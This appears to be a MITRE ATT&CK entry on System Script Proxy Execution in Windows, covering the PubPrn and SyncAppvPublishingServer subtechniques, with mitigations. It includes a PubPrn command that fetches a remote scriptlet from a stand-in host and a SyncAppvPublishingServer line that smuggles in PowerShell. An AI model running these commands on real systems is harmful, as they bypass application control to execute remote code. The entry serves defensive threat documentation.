---
id: T1216
name: System Script Proxy Execution
created: 2018-04-18 17:59:24.739000+00:00
modified: 2025-10-24 17:49:37.665000+00:00
type: attack-pattern
x_mitre_version: 2.1
x_mitre_domains: enterprise-attack
---

## Tactic

- [[defense_evasion|Defense Evasion]]

Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)

## Subtechniques

### T1216.001: PubPrn
^t1216001-pubprn

**Parent Technique**
- [[T1216-system_script_proxy_execution|T1216: System Script Proxy Execution]]

**Tactic**
- [[defense_evasion|Defense Evasion]]

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).

#### Properties

- id: T1216.001
- name: PubPrn
- created: 2020-02-03 16:49:57.788000+00:00
- modified: 2025-10-24 17:48:22.022000+00:00
- type: attack-pattern
- x_mitre_version: 2.1
- x_mitre_domains: enterprise-attack

### T1216.002: SyncAppvPublishingServer
^t1216002-syncappvpublishingserver

**Parent Technique**
- [[T1216-system_script_proxy_execution|T1216: System Script Proxy Execution]]

**Tactic**
- [[defense_evasion|Defense Evasion]]

Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv)
    
The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)

Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001) execution restrictions and evade defensive counter measures by "living off the land."(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv)

For example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands may be invoked using:(Citation: 5 - appv)

`SyncAppvPublishingServer.vbs "n; {PowerShell}"`

#### Properties

- id: T1216.002
- name: SyncAppvPublishingServer
- created: 2024-02-06 16:20:41.647000+00:00
- modified: 2025-04-15 23:13:55.573000+00:00
- type: attack-pattern
- x_mitre_version: 1.0
- x_mitre_domains: enterprise-attack

## Mitigations

- [[M1038-execution_prevention|M1038: Execution Prevention]]

## Platforms

- Windows

